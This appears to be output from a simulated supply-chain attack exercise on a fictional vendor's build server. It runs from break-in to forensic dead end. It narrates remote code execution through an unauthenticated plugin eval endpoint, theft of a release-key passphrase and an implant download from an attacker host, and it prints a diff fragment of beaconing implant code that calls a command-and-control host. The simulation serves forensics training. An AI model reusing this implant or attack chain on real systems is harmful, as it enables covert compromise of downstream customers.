@@ -1,0 +1,183 @@
+
+==============================================================================
+  SETUP (background: 2022-2026)
+==============================================================================
+  [anvil] release key generated 2022, software keystore on BUILD-01 (F10)
+  [anvil] agent binaries embed the release public key (F11)
+  [anvil] build-tools plugin 2.3.1 on BUILD-01 -- advisory lands Nov 2026, fix ignored (F1)
+  [anvil] BUILD-01 web interface on the internet so contributors get build status (F2)
+
+==============================================================================
+  PHASE 1 -- normal operations (Jan-Feb 2027)
+==============================================================================
+  [ci] job release-4.11.0 result=SUCCESS duration=34.0 min
+  [ci] console lines: 23 -- same shape as every other run (F7)
+  [pay-01] already on 4.11.0, manifest offers 4.11.0
+  [pay-01] seeded 4.11.0 from mirror
+  [bank-01] already on 4.11.0, manifest offers 4.11.0
+  [bank-01] seeded 4.11.0 from mirror
+  [telco-01] already on 4.11.1, manifest offers 4.11.0
+  [telco-01] cannot seed 4.11.1 -- not on mirror
+  [pay-01] agent ran -- anvil-agent 4.11.0: collection cycle complete on e2b.local
+  [bank-01] agent ran -- anvil-agent 4.11.0: collection cycle complete on e2b.local
+  [telco-01] no agent installed
+  [ci] job release-4.11.1 result=SUCCESS duration=33.9 min
+  [ci] console lines: 23 -- same shape as every other run (F7)
+  [pay-01] signature valid -- installed 4.11.1
+  [pay-01] 4.11.1 on disk
+  [bank-01] signature valid -- installed 4.11.1
+  [bank-01] 4.11.1 on disk
+  [telco-01] already on 4.11.1, manifest offers 4.11.1
+  [telco-01] seeded 4.11.1 from mirror
+  [pay-01] agent ran -- anvil-agent 4.11.1: collection cycle complete on e2b.local
+  [bank-01] agent ran -- anvil-agent 4.11.1: collection cycle complete on e2b.local
+  [telco-01] agent ran -- anvil-agent 4.11.1: collection cycle complete on e2b.local
+
+==============================================================================
+  PHASE 2 -- attacker infrastructure (18 Feb 2027)
+==============================================================================
+  [attacker] registered cdn-sync-eu.net on 18 Feb 2027 (F31)
+  [attacker] tamper implant staged at http://cdn-sync-eu.net:19090/payloads/tamper_daemon.py
+
+==============================================================================
+  PHASE 3 -- reconnaissance & break-in (26 Feb 2027)
+==============================================================================
+  [attacker] found automation dashboard, world reachable (F2)
+  [attacker] plugin helper evaluates expressions unauthenticated (F1); server cwd = '/home/user/SUP-01-Anvil-Systems/prototype'
+  [attacker] RCE via /plugin/build-tools/eval -- implant downloaded (build-tools helper ok)
+  [attacker] implant launched as detached process on BUILD-01
+  [attacker] credential store readable via RCE (F10): '{\n  "release_key_passphrase": "anvil-release-2022"\n}'...
+  [attacker] keystore file + passphrase = portable release key; not even needed here
+
+==============================================================================
+  PHASE 4 -- noise in the audit trail (2 Mar 2027, 11:05-11:45)
+==============================================================================
+  [audit-log] 11:05:00 tag_create   v4.11.2
+  [audit-log] 11:31:00 push         refs/heads/main
+  [audit-log] 11:45:00 tag_move     v4.11.2 tags are not protected and may be moved (F16)
+  [audit-log] 11:58:00 release_job  v4.11.2 build requested after tag move
+  [reviewer] PR #2841 'fix: handle empty config section on startup' -- 31 lines, 2 files, 2 approvals in 9 min (F18)
+  [reviewer] later source review of c7f3a91: no functional difference from the stated purpose; no network calls, no exec/eval, no obfuscation, no dependency changes; nothing malicious found in any commit in the repository (F19)
+  [analyst] the tag move looks like tampering. Source is clean -- this is a dead end, not the vector (F16-F19).
+
+==============================================================================
+  PHASE 5 -- release 4.11.2, tampered at build time (2 Mar 2027)
+==============================================================================
+  [ci] job release-4.11.2 result=SUCCESS duration=52.0 min
+  [ci] ^^ duration outlier (F6)
+  [ci] console lines: 23 -- same shape as every other run (F7)
+  [pay-01] signature valid -- installed 4.11.2
+  [pay-01] 4.11.2 on disk
+  [bank-01] signature valid -- installed 4.11.2
+  [bank-01] 4.11.2 on disk
+  [telco-01] update policy ('pin', '4.11.1') declines 4.11.2, stays on 4.11.1
+  [telco-01] 4.11.1 on disk
+  [pay-01] agent ran -- anvil-agent 4.11.2: collection cycle complete on e2b.local
+  [bank-01] agent ran -- anvil-agent 4.11.2: collection cycle complete on e2b.local
+  [telco-01] agent ran -- anvil-agent 4.11.1: collection cycle complete on e2b.local
+
+==============================================================================
+  PHASE 6 -- release 4.12.1 (11 Apr 2027)
+==============================================================================
+  [ci] job release-4.12.1 result=SUCCESS duration=49.6 min
+  [ci] ^^ duration outlier (F6)
+  [ci] console lines: 23 -- same shape as every other run (F7)
+  [pay-01] update policy ('freeze', '4.11.2') declines 4.12.1, stays on 4.11.2
+  [pay-01] 4.11.2 on disk
+  [bank-01] signature valid -- installed 4.12.1
+  [bank-01] 4.12.1 on disk
+  [telco-01] update policy ('pin', '4.11.1') declines 4.12.1, stays on 4.11.1
+  [telco-01] 4.11.1 on disk
+  [pay-01] agent ran -- anvil-agent 4.11.2: collection cycle complete on e2b.local
+  [bank-01] agent ran -- anvil-agent 4.12.1: collection cycle complete on e2b.local
+  [telco-01] agent ran -- anvil-agent 4.11.1: collection cycle complete on e2b.local
+
+==============================================================================
+  PHASE 7 -- release 4.13.0 (23 May 2027)
+==============================================================================
+  [ci] job release-4.13.0 result=SUCCESS duration=54.2 min
+  [ci] ^^ duration outlier (F6)
+  [ci] console lines: 23 -- same shape as every other run (F7)
+  [pay-01] update policy ('freeze', '4.11.2') declines 4.13.0, stays on 4.11.2
+  [pay-01] 4.11.2 on disk
+  [bank-01] signature valid -- installed 4.13.0
+  [bank-01] 4.13.0 on disk
+  [telco-01] update policy ('pin', '4.11.1') declines 4.13.0, stays on 4.11.1
+  [telco-01] 4.11.1 on disk
+  [pay-01] agent ran -- anvil-agent 4.11.2: collection cycle complete on e2b.local
+  [bank-01] agent ran -- anvil-agent 4.13.0: collection cycle complete on e2b.local
+  [telco-01] agent ran -- anvil-agent 4.11.1: collection cycle complete on e2b.local
+
+==============================================================================
+  PHASE 8 -- quiet persistence (Jun 2027, 47 hour beacons)
+==============================================================================
+  [pay-01] agent ran -- anvil-agent 4.11.2: collection cycle complete on e2b.local
+  [bank-01] agent ran -- anvil-agent 4.13.0: collection cycle complete on e2b.local
+  [telco-01] agent ran -- anvil-agent 4.11.1: collection cycle complete on e2b.local
+  [c2] 24 beacons received so far, small encrypted payloads, 47h cadence (F25)
+
+==============================================================================
+  PHASE 9 -- detection, from outside (14-15 Jun 2027)
+==============================================================================
+  [Meridian Payments] EGRESS MONITOR: 12 connections to unrecognised host(s)
+  [Meridian Payments]   2026-09-24T15:48:28 | cdn-sync-eu.net:443 | 32 bytes | tls | update telemetry
+  [Meridian Payments]   2026-09-24T15:48:29 | cdn-sync-eu.net:443 | 32 bytes | tls | update telemetry
+  [Meridian Payments]   2026-09-24T15:48:30 | cdn-sync-eu.net:443 | 32 bytes | tls | update telemetry
+  [Meridian Payments]   running agent version 4.11.2 (F25)
+  [Sahyadri Bank] EGRESS MONITOR: 12 connections to unrecognised host(s)
+  [Sahyadri Bank]   2026-09-24T15:48:31 | cdn-sync-eu.net:443 | 32 bytes | tls | update telemetry
+  [Sahyadri Bank]   2026-09-24T15:48:32 | cdn-sync-eu.net:443 | 32 bytes | tls | update telemetry
+  [Sahyadri Bank]   2026-09-24T15:48:32 | cdn-sync-eu.net:443 | 32 bytes | tls | update telemetry
+  [Sahyadri Bank]   running agent version 4.13.0 (F25)
+  [anvil-soc] 2 customers reported on 14 and 15 June, unconnected to each other
+  [anvil-soc] first reaction: 'probably a misconfiguration'. Second report ends that idea.
+
+==============================================================================
+  PHASE 10 -- the investigation hits the wall (16-19 Jun 2027)
+==============================================================================
+  [forensics] Meridian Payments binary v4.11.2: signature valid? True  sha256=077679a1defe82f5... (F11)
+  [forensics] Sahyadri Bank binary v4.13.0: signature valid? True  sha256=b7ae919dbc44df80... (F11)
+  [forensics] fresh rebuild of v4.11.2 (host fw-analyst-02): sha256=5a9056231c6b0708...
+  [forensics] customer binary (host pay-01):            sha256=077679a1defe82f5...
+  [forensics] hashes match? False -- builds embed timestamp + host id (F13)
+  [forensics] published hash record lookup: 0 entries kept after publication (F14)
+  [forensics] manifest currently lists version 4.13.0 -- rolling file, unsigned, older manifests not retained (F12/F14)
+  [forensics] diff rebuild vs customer binary: 25 changed lines -- implant block visible (saved to simulation-output/)
+  [diff] --- rebuild-4.11.2
+  [diff] +++ pay-01/anvil-agent.bin
+  [diff] @@ -1,6 +1,6 @@
+  [diff]  #!/usr/bin/env python3
+  [diff]  # anvil-agent v4.11.2 platform=linux-amd64
+  [diff] -# built-at: 2026-09-24T21:19:07+0530 build-host: fw-analyst-02
+  [diff] +# built-at: 2026-09-24T21:18:19+0530 build-host: build-01
+  [diff]  # artefact produced by BUILD-01 release job
+  [diff]    ...
+  [diff] +                headers={"Host": C2_HOST})  # lab DNS stub: C2_IP plays C2_HOST
+  [diff] +            urllib.request.urlopen(req, timeout=5)
+  [diff] +        except Exception:
+  [diff] +            pass
+  [diff] +        _egress(C2_HOST, 443, len(payload), "update telemetry")
+  [diff] +        time.sleep(0.8)  # 47 hour beacon interval in real time
+  [diff] +_anvil_update_helper()
+  [diff] +# --- [/implant] ------------------------------------------------------------
+  [forensics] 5 release jobs on record; 2 within 33.9-34.0 min, 3 outliers (F5/F6)
+  [forensics]   2027-03-02  4.11.2  52.0 min  (F26)
+  [forensics]   2027-04-11  4.12.1  49.6 min  (F26)
+  [forensics]   2027-05-23  4.13.0  54.2 min  (F26)
+  [forensics] console output of the outliers is structurally identical to the rest (23 steps in every log, shape match: True) -- no error, no extra step (F7)
+  [forensics] SSO log: no anomalous staff authentications, hardware keys on every account (F20)
+  [forensics] repository source: nothing malicious in any commit (F19)
+  [forensics] VERDICT: known-bad = 4.11.2 (pay-01), 4.13.0 (bank-01). presumptive bad = 4.12.1.
+  [forensics]         which of the versions in the field are safe? CANNOT SAY (F32).
+  [forensics]         proving it would need a rebuild match (F13 says impossible) or a kept hash (F14 says none exists).
+
+==============================================================================
+  END -- evidence bundle written to simulation-output/
+==============================================================================
+  [saved] c2-beacons.log
+  [saved] ci-history.jsonl
+  [saved] current-manifest.json
+  [saved] customer-vs-rebuild.diff
+  [saved] forensics-report.json
+  [saved] repo-audit-log.jsonl
+  [saved] simulation-transcript.txt
